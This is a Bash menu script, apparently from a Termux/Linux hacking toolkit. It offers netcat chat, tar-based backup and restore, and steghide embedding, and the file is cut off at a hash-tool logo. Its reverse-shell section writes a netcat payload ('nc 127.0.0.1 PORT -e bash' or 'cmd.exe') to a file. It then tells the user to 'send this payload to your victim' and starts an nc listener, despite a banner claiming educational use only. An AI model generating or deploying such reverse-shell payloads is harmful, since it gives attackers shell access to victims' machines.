########-Colours-########
black=' \e[1;30m '
red=' \e[1;31m '
green=' \e[1;32m '
yellow=' \e[1;33m '
blue=' \e[1;34m '
purple=' \e[1;35m '
cyan=' \e[1;36m '
white=' \e[1;37m '
Grey=' \e[1;38m '   # Not The Default color but a bolder one
Default=' \e[1;39m '
RED="\e[41m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
########################
####
#########--NET-CHAT-LOGO--###########--MRX
chat-logo(){
  clear
  echo -e "";
  echo -e "\e[1;37m ______                 \e[1;31m______ _                ";
  sleep 0.02
  echo -e "\e[1;37m|  ___ \       _       \e[1;31m/ _____) |          _    ";
  sleep 0.02
  echo -e "\e[1;37m| |   | | ____| |_    \e[1;31m| /     | | _   ____| |_  ";
  sleep 0.02
  echo -e "\e[1;37m| |   | |/ _  )  _)   \e[1;31m| |     | || \ / _  |  _) ";
  sleep 0.02
  echo -e "\e[1;37m| |   | ( (/ /| |__   \e[1;31m| \_____| | | ( ( | | |__ ";
  sleep 0.02
  echo -e "\e[1;37m|_|   |_|\____)\___)   \e[1;31m\______)_| |_|\_||_|\___)";
  sleep 0.02
  echo -e "\e[1;33m";
}
#########--NET-CHAT-RUN--###########--MRX
chat-run(){
  echo -e "";
  echo -e "┌──────────────────┐           ┌──────────────────┐";
  echo -e "│(\e[1;37m1\e[1;33m) \e[1;37mConnect       \e[1;33m│           │(\e[1;37m2\e[1;33m) \e[1;37mListen        \e[1;33m│";
  echo -e "└──────────────────┘           └──────────────────┘";
  sleep 0.3
  echo -e '\e[1;36m';
  read -p " Choose an option or { 99 to go back } :  " chatway;
  echo -e "";
  if [[ $chatway == '99' ]] ;
  then
     clear
     letter
     logo
     list
     conditions
  elif [[ $chatway == '' ]] ;
  then
     echo -e " \e[1;32mChoose an option ";
     echo -e "";
     sleep 0.5
     echo -e "\e[1;31m{\e[1;37m*\e[1;31m} \e[1;37mLoading \e[1;31m.....";
     sleep 1
     chat-logo
     chat-run
  elif [[ $chatway == '1' ]] ;
  then
     echo -e " \e[1;32m{\e[1;37m*\e[1;32m} \e[1;30mLocalhost \e[1;32m127.0.0.1 \e[1;30mis recommended for ensured connection ";
     sleep 0.05
     echo -e "\e[1;33m";
     echo -e " [\e[1;37m¥\e[1;33m]\e[1;37m Make sure the other side has started the listening \e[1;31mfirst";
     echo -e "\e[1;32m";
     read -p " Set the IP ::  " chatip;
     echo -e "\e[1;34m";
     read -p " Set the PORT ::  " chatport;
     echo -e "";
     echo -e " \e[1;37m------------\e[1;32m[\e[1;37mSTART\e[1;32m-\e[1;37mCHAT\e[1;32m]\e[1;37m------------";
     echo -e "";
     nc $chatip $chatport
     echo -e "";
     echo -e " -------------\e[1;31m[\e[1;37mEND\e[1;31m-\e[1;37mCHAT\e[1;31m]\e[1;37m-------------";
     echo -e "";
  elif [[ $chatway == '2' ]] ;
  then
     echo -e "\e[1;32m";
     read -p " Type a PORT to listen on ::  " listenport;
     echo -e "\e[1;37m";
     printf " \e[1;34m{\e[1;37m*\e[1;34m} \e[1;37mStart Listening \e[1;34m? \e[1;31m[\e[1;37my\e[1;31m/\e[1;37mn\e[1;31m] \e[1;37m::  ";
     read -p '' qstart;
     echo -e "" && echo -e ""
     if [[ $qstart == 'y' ]] ;
     then
        echo -e " \e[1;37m--------------\e[1;32m[\e[1;37mSTARTED\e[1;32m]\e[1;37m-------------";
        echo -e "";
        nc -lvp $listenport
        echo -e "";
        echo -e " ---------------\e[1;31m[\e[1;37mENDED\e[1;31m]\e[1;37m--------------";
        echo -e "";
     elif [[ $qstart == 'n' ]] ;
     then
        echo -e " \e[1;37mO.K \e[1;31m, \e[1;37mBye ";
        sleep 1.1
        chat-logo
	chat-run
     else
        echo -e " \e[1;31m{\e[1;37m*\e[1;31m} \e[1;37mInvalid Option \e[1;31m!!\e[1;37m";
        sleep 1.1
        chat-logo
        chat-run
     fi
  else
     echo -e " \e[1;32mChoose an option ";
     echo -e "";
     sleep 0.5
     echo -e "\e[1;31m{\e[1;37m*\e[1;31m} \e[1;37mLoading \e[1;31m.....";
     sleep 1
     chat-logo
     chat-run
  fi
}
##########--REVERSE-SHELL--#########--MRX
####
##########--RS-LOGO--#############
RS-logo(){
  clear
  echo -e "\e[1;31m╦═╗┌─┐┬  ┬┌─┐┬─┐┌─┐┌─┐  \e[1;37m╔═╗┬ ┬┌─┐┬  ┬  ";
  sleep 0.03
  echo -e "\e[1;31m╠╦╝├┤ └┐┌┘├┤ ├┬┘└─┐├┤   \e[1;37m╚═╗├─┤├┤ │  │  ";
  sleep 0.03
  echo -e "\e[1;31m╩╚═└─┘ └┘ └─┘┴└─└─┘└─┘  \e[1;37m╚═╝┴ ┴└─┘┴─┘┴─┘";
  sleep 0.03
}
#######--METHOD--########
method(){
  termux="../usr/bin/bash"
  linux="/usr/bin/bash"
  windows="cmd.exe"
  echo -e "\e[1;32m";
  echo -e " ┌───────────────────┐           ┌───────────────────┐";
  echo -e " │(\e[1;37m1\e[1;32m)\e[1;37m LocalHost      \e[1;32m│           │\e[1;32m(\e[1;37m2\e[1;32m) \e[1;37mNGROK (SOON)   \e[1;32m│";
  echo -e " └───────────────────┘           └───────────────────┘";
  echo -e "\e[1;33m";
  read -p " Choose the Host >>  " host;
  if [[ $host == '1' ]] ;
  then
     echo -e "\e[1;32m";
     read -p " Now set the Port >>  " port;
     echo -e "\e[1;36m";
     read -p " Name your payload >>  " name;
     echo -e "";
     echo -e " \e[1;31m{\e[1;37m*\e[1;31m} \e[1;37mWait a second ";
     sleep 1.3
     if [[ $platform == '1' ]] ;
     then
        touch /$HOME/Tool-H/payloads/$name && echo "cd && nc 127.0.0.1 ${port} -e $termux" > /$HOME/Tool-H/payloads/$name
        echo -e "";
        echo -e " \e[1;37mNow send this payload \e[1;37m'\e[1;31m$name\e[1;37m' \e[1;37mto your victim .Its in the '\e[1;32mpayloads\e[1;37m' in Tool's Folder";
        echo -e "";
        sleep 1.5
        nc -lvp $port
     elif [[ $platform == '2' ]] ;
     then
        touch /$HOME/Tool-H/payloads/$name && echo "cd && nc 127.0.0.1 ${port} -e $linux" > /$HOME/Tool-H/payloads/$name
        echo -e "";
        echo -e " \e[1;37mNow send this payload \e[1;37m'\e[1;31m$name\e[1;37m' \e[1;37mto your victim .Its in the '\e[1;32mpayloads\e[1;37m' in Tool's Folder";
        echo -e "";
        sleep 1.5
        nc -lvp $port
     elif [[ $platform == '3' ]] ;
     then
        touch /$HOME/Tool-H/payloads/$name && echo "nc 127.0.0.1 ${port} -e $windows" > /$HOME/Tool-H/payloads/$name
        echo -e "";
        echo -e " \e[1;37mNow send this payload \e[1;37m'\e[1;31m$name\e[1;37m' \e[1;37mto your victim . Its in the '\e[1;32mpayloads\e[1;37m' in Tool's Folder";
        echo -e "";
        sleep 1.5
        nc -lvp $port
     fi         #  Its in the '\e[1;32mpayloads\e[1;37m' in Tool's Folder
  else
     echo -e "";
     echo -e " \e[1;37m{\e[1;31m*\e[1;37m} \e[1;31mPlease Choose a Host Number ";
     RS-logo
     RS-list
  fi
}
#########--RS-LIST--##########
RS-list(){
  echo -e "";
  echo -e " ${RED}THIS TOOLIS MADE FOR EDUCATIONAL PURPOSE AND PENETRATION TESTING ONLY ${ENDCOLOR}";
  sleep 0.4
  echo -e "\e[1;30m";
  echo -e " This Reverse Shell doesn't support all linux distros";
  echo -e " due to their differences in the shell files as 'bash' ";
  echo -e "";
  sleep 0.4
  echo -e " \e[1;31m{\e[1;37m*\e[31m}\e[0m Many other linux distros will be supported in future updates";
  echo -e " Currently Supported Distros are \e[1;32mKali Linux \e[1;37m, \e[1;32mUbuntu \e[1;37m, \e[1;32mKali nethunter";
  echo -e " Manjaro Linux \e[1;37m& \e[1;32mFedora";
  echo -e "";
  sleep 0.4
  echo -e " \e[1;37m{\e[1;31m*\e[1;37m}\e[1;30m Currently supports only reverse shell by \e[1;31mlocalhost \e[1;30m";
  echo -e " more methods will be provided in future updates";
  sleep 0.5
  echo -e "\e[1;31m";
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │(\e[1;37m1\e[1;31m) \e[1;37mTermux           \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.3
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │(\e[1;37m2\e[1;31m) \e[1;37mOther Linux      \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.3
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │(\e[1;37m3\e[1;31m) \e[1;37mWindows CMD      \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.3
  echo -e "\e[1;37m";
  set plat = " "
  read -p " Choose a Platform { 99 to go back } >>  " platform;
  if [[ $platform == '99' ]] ;
  then
     clear
     letter
     logo
     list
     conditions
  elif [[ $platform == '1' ]] ;
  then
     method
  elif [[ $platform == '2' ]] ;
  then
     method
  elif [[ $platform == '3' ]] ;
  then
     method
  else
     echo -e "";
     echo -e " \e[1;37m{\e[1;31m*\e[1;37m} \e[1;31mPlease Choose a Platform";
     RS-logo
     RS-list
  fi
}

##########--B.A.C.K.U.P-&-R.E.S.T.O.R.E--##########--MRX
br_logo(){
  echo''
  clear
  echo -e " \e[1;37m______       \e[1;31m___        \e[1;37m_______     ";
  sleep 0.03
  echo -e "\e[1;37m|_   _ \    \e[1;31m.° _ °.     \e[1;37m|_   __ \    ";
  sleep 0.03
  echo -e "  \e[1;37m| |_) |   \e[1;31m| (_) '___    \e[1;37m| |__) |   ";
  sleep 0.03
  echo -e "  \e[1;37m|  __'.   \e[1;31m.°___°/ _/    \e[1;37m|  __ /    ";
  sleep 0.03
  echo -e " \e[1;37m_| |__) | \e[1;31m| (___)  \_   \e[1;37m_| |  \ \_  ";
  sleep 0.03
  echo -e "\e[1;37m|_______/  \e[1;31m°._____.\__| \e[1;37m|____| |___| ";
  sleep 0.03
  echo''
}
restore_logo(){
  clear
  echo -e '\e[1;37m';
  sleep 0.03
  echo -e '______                                   ';
  sleep 0.03
  echo -e '(_____ \            _                    ';
  sleep 0.03
  echo -e ' _____) ) ____  ___| |_  ___   ____ ____ ';
  sleep 0.03
  echo -e '\e[1;31m(_____ ( / _  )/___)  _)/ _ \ / ___) _  )';
  sleep 0.03
  echo -e '      | ( (/ /|___ | |_| |_| | |  ( (/ / ';
  sleep 0.03
  echo -e '      |_|\____|___/ \___)___/|_|   \____)';
  sleep 0.03
}
backup_logo(){
  clear
  echo -e '\e[1;37m';
  echo -e ' ______              _                 ';
  sleep 0.03
  echo -e '(____  \            | |                ';
  sleep 0.03
  echo -e ' ____)  ) ____  ____| |  _ _   _ ____  ';
  sleep 0.03
  echo -e '|  __  ( / _  |/ ___) | / ) | | |  _ \ ';
  sleep 0.03
  echo -e '\e[1;31m| |__)  | ( | ( (___| |< (| |_| | | | |';
  sleep 0.03
  echo -e '|______/ \_||_|\____)_| \_)\____| ||_/ ';
  sleep 0.03
  echo -e '                                |_|    ';
  sleep 0.03
}
br_list(){
  echo -e '\e[1;31m';
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ (\e[1;37m1\e[1;31m) \e[1;37mB\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37mC\e[1;31m.\e[1;37mK\e[1;31m.\e[1;37mU\e[1;31m.\e[1;37mP     \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ (\e[1;37m2\e[1;31m) \e[1;37mR\e[1;31m.\e[1;37mE\e[1;31m.\e[1;37mS\e[1;31m.\e[1;37mT\e[1;31m.\e[1;37mO\e[1;31m.\e[1;37mR\e[1;31m.\e[1;37mE   \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e '\e[1;33m';
  read -p 'Choose an Operation {99 to go back} : ' op;
  if [[ $op == '' ]] ;
  then
     echo''
     echo -e '\e[1;31m Choose a Number';
     echo''
     echo -e ' \e[1;37mLoading\e[1;32m......';
     sleep 2.6
     br_logo
     br_list
  elif [[ $op == '1' ]] ;
  then
     backup_logo
     backup_list
  elif [[ $op == '2' ]] ;
  then
     restore_logo
     restore_list
  elif [[ $op == '99' ]] ;
  then
     clear
     letter
     logo
     list
     conditions
  else
     echo''
     echo -e '\e[1;31m Choose a Number';
     echo''
     echo -e ' \e[1;37mLoading\e[1;32m......';
     sleep 2.6
     br_logo
     br_list
  fi
}
backup_list(){
  echo -e '\e[1;31m';
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ \e[1;31m(\e[1;37m1\e[1;31m)\e[1;37m Termux          \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ (\e[1;37m2\e[1;31m) \e[1;37mOther           \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e '\e[1;33m';
  read -p ' Choose Your Environment : ' en;
  if [[ $en == '' ]] ;
  then
     echo''
     echo -e '\e[1;31m Choose a Number';
     echo''
     echo -e ' \e[1;37mLoading\e[1;32m......';
     sleep 2.6
     backup_logo
     backup_list
  elif [[ $en == '2' ]] ;
  then
     echo''
     read -p ' Choose what to backup [ 1.System , 2.other files] : ' ba;
     if [[ $ba == '' ]] ;
     then
        echo''
        echo -e '\e[1;31m Choose a Number';
        echo''
        echo -e ' \e[1;37mLoading\e[1;32m......';
        sleep 2.6
        backup_logo
        backup_list
     elif [[ $ba == '1' ]] ;
     then
        echo''
        echo -e '\e[1;37mBacking Up \e[1;32m( \e[1;37mAll non-permissioned PREFIX Files \e[1;32m) \e[1;37mfolders to \e[1;31m{\e[1;37m/$PREFIX/BR.tgz\e[1;31m}\e[1;37m';
        sleep 1.5
        echo''
        echo -e '\e[1;37m--------------------\e[1;32m[ START \e[1;37mBACKUP \e[1;32m]\e[1;37m--------------------';
        echo''
        cd /$PREFIX && tar -cvzf /$PREFIX/BR.tgz  home usr root bin etc boot run opt proc sys tmp var srv
        echo''
        echo -e '\e[1;37m--------------------\e[1;31m[ END \e[1;37mBACKUP \e[1;31m]\e[1;37m--------------------';
     elif [[ $ba == '2' ]] ;
     then
        echo''
        echo -e '\e[1;37m------------\e[1;32m[START \e[1;37mFILES\e[1;32m]\e[1;37m------------';
        echo''
        ls
        echo''
        echo -e '\e[1;37m-------------\e[1;31m[END \e[1;37mFILES\e[1;31m]\e[1;37m-------------';
        echo''
        read -p 'Type the file path : ' fl;
        if [[ $fl == '' ]] ;
        then
           echo''
           echo -e '\e[1;31m Type a path';
           echo''
           echo -e ' \e[1;37mLoading\e[1;32m......';
           sleep 2.6
           backup_logo
           backup_list
        else
           echo''
           echo -e '\e[1;32mO.K';
           echo''
           echo -e '\e[1;37mBacking up your files to \e[1;31m{\e[1;37m/$PREFIX/BR.tgz\e[1;31m}';
           echo''
           sleep 1.6
           echo -e '\e[1;37m------------\e[1;32m[START \e[1;37mBACK UP\e[1;32m]\e[1;37m------------';
           echo''
           tar -cvzf /$PREFIX/BR.tgz $fl
           echo''
           echo -e '\e[1;37m-------------\e[1;31m[END \e[1;37mBACK UP\e[1;31m]\e[1;37m-------------';
           echo''
        fi
     else
        echo''
        echo -e '\e[1;31m Choose a Number';
        echo''
        echo -e ' \e[1;37mLoading\e[1;32m......';
        sleep 2.6
        backup_logo
        backup_list
     fi
  elif [[ $en == '1' ]] ;
  then
     echo''
     read -p ' Choose what to backup [ 1.System , 2.other] : ' ca;
     if [[ $ca == '' ]] ;
     then
        echo''
        echo -e '\e[1;31m Choose a Number';
        echo''
        echo -e ' \e[1;37mLoading\e[1;32m......';
        sleep 2.6
        backup_logo
        backup_list
     elif [[ $ca == '1' ]] ;
     then
        echo''
        echo -e '\e[1;37mBacking Up \e[1;32m( \e[1;37musr , home \e[1;32m) \e[1;37mfolders to \e[1;31m{\e[1;37m/sdcard/MRXBACKUP.tgz\e[1;31m}\e[1;37m';
        sleep 1.5
        echo''
        echo -e '\e[1;37m--------------------\e[1;32m[ START \e[1;37mBACKUP \e[1;32m]\e[1;37m--------------------';
        echo''
        cd && cd .. && tar -cvzf /sdcard/MRXBACKUP.tgz home usr
        echo''
        echo -e '\e[1;37m--------------------\e[1;31m[ END \e[1;37mBACKUP \e[1;31m]\e[1;37m--------------------';
     elif [[ $ca == '2' ]] ;
     then
        echo''
        echo -e '\e[1;37m------------\e[1;32m[START \e[1;37mFILES\e[1;32m]\e[1;37m------------';
        echo''
        ls
        echo''
        echo -e '\e[1;37m-------------\e[1;31m[END \e[1;37mFILES\e[1;31m]\e[1;37m-------------';
        echo''
        read -p 'Type the file path : ' bl;
        if [[ $bl == '' ]] ;
        then
           echo''
           echo -e '\e[1;31m Type a path';
           echo''
           echo -e ' \e[1;37mLoading\e[1;32m......';
           sleep 2.6
           backup_logo
           backup_list
        else
           echo''
           echo -e '\e[1;32mO.K';
           echo''
           echo -e '\e[1;37mBacking up your files to \e[1;31m{\e[1;37m/sdcard/MRXBACKUP.tgz\e[1;31m}';
           echo''
           sleep 1.6
           echo -e '\e[1;37m------------\e[1;32m[START \e[1;37mBACK UP\e[1;32m]\e[1;37m------------';
           echo''
           tar -cvzf /sdcard/MRXBACKUP.tgz  $bl
           echo''
           echo -e '\e[1;37m-------------\e[1;31m[END \e[1;37mBACK UP\e[1;31m]\e[1;37m-------------';
           echo''
        fi
     else
        echo''
        echo -e '\e[1;31m Choose a Number';
        echo''
        echo -e ' \e[1;37mLoading\e[1;32m......';
        sleep 2.6
        backup_logo
        backup_list
     fi
  else
     echo''
     echo -e '\e[1;31m Choose a Number';
     echo''
     echo -e ' \e[1;37mLoading\e[1;32m......';
     sleep 2.6
     backup_logo
     backup_list
  fi
}
restore_list(){
  echo -e '\e[1;31m';
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ \e[1;31m(\e[1;37m1\e[1;31m) \e[1;37mTermux          \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ (\e[1;37m2\e[1;31m) \e[1;37mOther           \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e '\e[1;33m';
  read -p ' Choose Your Environment : ' cn;
  if [[ $cn == '' ]] ;
  then
     echo''
     echo -e '\e[1;31m Choose a Number';
     echo''
     echo -e ' \e[1;37mLoading\e[1;32m......';
     sleep 2.6
     restore_logo
     restore_list
  elif [[ $cn == '2' ]] ;
  then
     echo -e '\e[1;37m';
     read -p 'Enter the (.tgz) file path : ' otherpath;
     if [[ $otherpath == '' ]] ;
     then
        echo ''
        echo -e '\e[1;31mEnter file path';
        echo''
        echo -e ' \e[1;37mLoading\e[1;32m......';
        sleep 2.6
        restore_logo
        restore_list
     else
        echo -e '';
        echo -e ' \e[1;31m[\e[1;37m1\e[1;31m] \e[1;37mIs This file a Full system backup \e[1;32m(\e[1;37mhome \e[1;32m& \e[1;37musr folders \e[1;32m) \e[1;31m? \e[1;32mOR \e[1;31m[\e[1;37m2\e[1;31m]\e[1;37ma normal \e[1;32m.tgz \e[1;37mfile \e[1;31m?';
        read -p 'choose a number--->  ' otherfile;
        if [[ $otherfile == '' ]] ;
        then
           echo ''
           echo -e '\e[1;31mChoose a number';
           echo''
           echo -e ' \e[1;37mLoading\e[1;32m......';
           sleep 2.6
           restore_logo
           restore_list
        elif [[ $otherfile == '1' ]] ;
        then
           echo''
           echo -e '\e[1;37m-----------------\e[1;32m[START \e[1;37mRESTORING\e[1;32m]\e[1;37m-----------------';
           echo''
           cd /$PREFIX && tar -xvzf $otherpath
           echo''
           echo -e '\e[1;37m------------------\e[1;31m[END \e[1;37mRESTORING\e[1;31m]\e[1;37m------------------';
        elif [[ $otherfile == '2' ]] ;
        then
           echo''
           echo -e '\e[1;37m-----------------\e[1;32m[START \e[1;37mRESTORING\e[1;32m]\e[1;37m-----------------';
           echo''
           cd /$HOME && tar -xvzf $otherpath
           echo''
           echo -e '\e[1;32m Your Folders exists in \e[1;37m/\e[1;31m$HOME \e[1;32mDirctory';
           echo''
           echo -e '\e[1;37m------------------\e[1;31m[END \e[1;37mRESTORING\e[1;31m]\e[1;37m------------------';
        else
           echo ''
           echo -e '\e[1;31mChoose a number';
           echo''
           echo -e ' \e[1;37mLoading\e[1;32m......';
           sleep 2.6
           restore_logo
           restore_list
        fi
     fi

  elif [[ $cn == '1' ]] ;
  then
     echo -e '\e[1;37m';
     read -p 'Enter the (.tgz) file path : ' termuxpath;
     if [[ $termuxpath == '' ]] ;
     then
        echo ''
        echo -e '\e[1;31mEnter file path';
        echo''
        echo -e ' \e[1;37mLoading\e[1;32m......';
        sleep 2.6
        restore_logo
        restore_list
     else
        echo -e '';
        echo -e ' \e[1;31m[\e[1;37m1\e[1;31m] \e[1;37mIs This file a Full system backup \e[1;32m(\e[1;37mroot \e[1;32m& \e[1;37musr folders \e[1;32m) \e[1;31m? \e[1;32mOR \e[1;31m[\e[1;37m2\e[1;31m]\e[1;37ma normal \e[1;32m.tgz \e[1;37mfile \e[1;31m?';
        read -p 'choose a number--->  ' termuxfile;
        if [[ $termuxfile == '' ]] ;
        then
           echo ''
           echo -e '\e[1;31mChoose a number';
           echo''
           echo -e ' \e[1;37mLoading\e[1;32m......';
           sleep 2.6
           restore_logo
           restore_list
        elif [[ $termuxfile == '1' ]] ;
        then
           echo''
           echo -e '\e[1;37m-----------------\e[1;32m[START \e[1;37mRESTORING\e[1;32m]\e[1;37m-----------------';
           echo''
           cd  && cd .. && tar -xvzf $termuxpath
           echo''
           echo -e '\e[1;37m------------------\e[1;31m[END \e[1;37mRESTORING\e[1;31m]\e[1;37m------------------';
        elif [[ $termuxfile == '2' ]] ;
        then
           echo''
           echo -e '\e[1;37m-----------------\e[1;32m[START \e[1;37mRESTORING\e[1;32m]\e[1;37m-----------------';
           echo''
           cd && tar -xvzf $termuxpath
           echo''
           echo -e '\e[1;32m Your Folders exists in \e[1;37m/\e[1;31mhome \e[1;37mDirctory';
           echo''
           echo -e '\e[1;37m------------------\e[1;31m[END \e[1;37mRESTORING\e[1;31m]\e[1;37m------------------';
        else
           echo ''
           echo -e '\e[1;31mChoose a number';
           echo''
           echo -e ' \e[1;37mLoading\e[1;32m......';
           sleep 2.6
           restore_logo
           restore_list
        fi
     fi
  else
     echo''
     echo -e '\e[1;31m Choose a Number';
     echo''
     echo -e ' \e[1;37mLoading\e[1;32m......';
     sleep 2.6
     restore_logo
     restore_list
  fi
}
##########--S.T.E.G_L.O.G.O--##########-MRX
logo_steg(){
  clear
  echo''
  echo -e "\e[1;31m.-..-. .-..-..-. .-..--. .-..--.  \e[1;37m.-.   .-. .-. .-..-.   .-..--. ";
  sleep 0.03
  echo -e "\e[1;31m| | ~   ~ | | ~  | | ~~  | | ~~   \e[1;37m| | _ | | | | | |  .-. | | ~~  ";
  sleep 0.03
  echo -e " \e[1;31m'\|      | |    | | _   | |  __  \e[1;37m| |°-'| | | | | |  | | | | _   ";
  sleep 0.03
  echo -e "   \e[1;31m|\     | |    | |°-'  | | °. | \e[1;37m| |   | | | | | |  | | | |°-'  ";
  sleep 0.03
  echo -e " \e[1;31m_ | |    | |    | | __  | | _| | \e[1;37m| |   | | | | | | _°-' | | __  ";
  sleep 0.03
  echo -e "\e[1;31m°-'°-'    °-'    °-'°--' °-'°---' \e[1;37m°-'   °-' °-' °-'°-'   °-'°--' ";
  sleep 0.03
  echo''
  echo''
}
##########--S.T.E.G_L.I.S.T--##########-MRX
list_steg(){
  echo -e '\e[1;31m';
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ \e[1;31m(\e[1;37m1\e[1;31m) \e[1;37mE\e[1;31m.\e[1;37mM\e[1;31m.\e[1;37mB\e[1;31m.\e[1;37mE\e[1;31m.\e[1;37mD       \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ (\e[1;37m2\e[1;31m) \e[1;37mE\e[1;31m.\e[1;37mX\e[1;31m.\e[1;37mT\e[1;31m.\e[1;37mR\e[1;31m.\e[1;37mA\e[1;31m.\e[1;37mC\e[1;31m.\e[1;37mT   \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo -e " ┌─────────────────────┐";
  echo -e " │                     │";
  echo -e " │ (\e[1;37m3\e[1;31m) \e[1;37mI\e[1;31m.\e[1;37mN\e[1;31m.\e[1;37mF\e[1;31m.\e[1;37mO         \e[1;31m│";
  echo -e " │                     │";
  echo -e " └─────────────────────┘";
  sleep 0.03
  echo''
  echo -e '\e[1;37m';
  read -p 'Choose a Number {99 to go back} : ' steg;
  if [[ $steg == '99' ]] ;
  then
     clear
     letter
     logo
     list
     conditions
  elif [[ $steg == '' ]] ;
  then
     echo''
     echo -e $red'Choose a Number From The List';
     echo ''
     sleep 0.6
     echo -e ' \e[1;37mLoading\e[1;32m.....';
     sleep 2.6
     logo_steg
     list_steg
  elif [[ $steg == '3' ]] ;
  then
     echo''
     echo -e '--------------\e[1;32m[\e[1;37mFiles\e[1;32m]\e[1;37m--------------';
     echo''
     ls
     echo''
     echo -e '--------------\e[1;31m[\e[1;37mFiles\e[1;31m]\e[1;37m--------------';
     echo''
     echo''
     echo -e '\e[1;31m┌────{ \e[1;37mSelect Stego File \e[1;31m}';
     echo -e '│';
     read -p '└───────────>>> ' info;
     if [[ $info == '' ]] ;
     then
        echo''
        echo -e '\e[1;31mChoose a Stego file';
        echo''
        echo -e '\e[1;37mLoading\e[1;32m......';
        sleep 2.5
        logo_steg
        list_steg
     else
        echo''
        echo -e '\e[1;37mRoger That \e[1;32m√';
        sleep 1.3
        echo''
        echo -e '\e[1;37m------------\e[1;32m[ START \e[1;37mGETTING INFO \e[1;32m]\e[1;37m------------';
        sleep 1.3
        echo -e '\e[1;32m';
        steghide info $info
        echo''
        sleep 0.5
        echo -e '\e[1;37m-------------\e[1;31m[ END \e[1;37mGETTING INFO \e[1;31m]\e[1;37m-------------';
     fi
  elif [[ $steg == '2' ]]
  then
     echo''
     echo -e '--------------\e[1;32m[\e[1;37mFiles\e[1;32m]\e[1;37m--------------';
     echo''
     ls
     echo''
     echo -e '--------------\e[1;31m[\e[1;37mFiles\e[1;31m]\e[1;37m--------------';
     echo''
     echo -e '\e[1;31m┌────{ \e[1;37mSelect Stego File \e[1;31m}';
     echo -e '│';
     read -p '└───────────>>> ' stego;
     if [[ $stego == '' ]] ;
     then
        echo''
        echo -e '\e[1;31mChoose a Stego file';
        echo''
        echo -e '\e[1;37mLoading\e[1;32m......';
        sleep 2.5
        logo_steg
        list_steg
     else
        echo''
        echo -e '\e[1;32m┌────{ \e[1;37mSpecify the used password \e[1;32m}';
        echo -e '│';
        read -p '└───────────>>> ' phrase;
        if [[ $phrase == '' ]] ;
        then
           echo''
           echo -e '\e[1;31mYou must enter the used Password';
           echo''
           echo -e '\e[1;37mLoading\e[1;32m......';
           sleep 2.5
           logo_steg
           list_steg
        else
           echo''
           echo -e '\e[1;37mRoger That \e[1;32m√';
           sleep 1.3
           echo''
           echo -e '\e[1;37m------------\e[1;32m[ START \e[1;37mEXTRACTING \e[1;32m]\e[1;37m------------';
           sleep 1.7
           echo -e '\e[1;32m';
           steghide extract -sf $stego -p $phrase -v
           echo''
           sleep 0.5
           echo -e '\e[1;37m-------------\e[1;31m[ END \e[1;37mEXTRACTING \e[1;31m]\e[1;37m-------------';
        fi
     fi
  elif [[ $steg == '1' ]] ;
  then
     echo''
     echo -e '--------------\e[1;32m[\e[1;37mFiles\e[1;32m]\e[1;37m--------------';
     echo''
     ls
     echo''
     echo -e '--------------\e[1;31m[\e[1;37mFiles\e[1;31m]\e[1;37m--------------';
     echo''
     echo -e '\e[1;31m┌────{ \e[1;37mSelect CoverFile \e[1;32m(\e[1;37mimage file\e[1;32m) \e[1;31m}';
     echo -e '│';
     read -p '└───────────>>> ' image;
     if [[ $image == '' ]] ;
     then
        echo''
        echo -e '\e[1;31mEnter an image file';
        echo''
        echo -e '\e[1;37mLoading\e[1;32m......';
        sleep 2.5
        logo_steg
        list_steg
     else
        echo''
        echo -e '\e[1;32m┌────{ \e[1;37mOK now select the file to be Embeded \e[1;32m}';
        echo -e '│';
        read -p '└───────────>>> ' file;
        if [[ $file == '' ]] ;
        then
           echo''
           echo -e '\e[1;31mEnter a file';
           echo''
           echo -e '\e[1;37mLoading\e[1;32m......';
           sleep 2.5
           logo_steg
           list_steg
        else
           echo''
           echo -e '\e[1;33m┌────{ \e[1;37mSpecify a Password \e[1;33m}';
           echo -e '│';
           read -p '└───────────>>> ' pass;
           if [[ $pass == '' ]] ;
           then
              echo''
              echo -e '\e[1;31mYou must enter a Password';
              echo''
              echo -e '\e[1;37mLoading\e[1;32m......';
              sleep 2.5
              logo_steg
              list_steg
           else
              echo''
              echo -e '\e[1;37mRoger That \e[1;32m√';
              sleep 1.3
              echo''
              echo -e '\e[1;37m------------\e[1;32m[ START \e[1;37mEMBEDDING \e[1;32m]\e[1;37m------------';
              sleep 1.7
              echo -e '\e[1;32m';
              steghide embed -cf $image -ef $file -p $pass -v
              echo''
              sleep 0.5
              echo -e '\e[1;37m-------------\e[1;31m[ END \e[1;37mEMBEDDING \e[1;31m]\e[1;37m-------------';
           fi
        fi
     fi
  fi
}
##########--H.A.S.H_L.O.G.O--##########-MRX
logo_hash(){
  clear
  echo''
  echo''
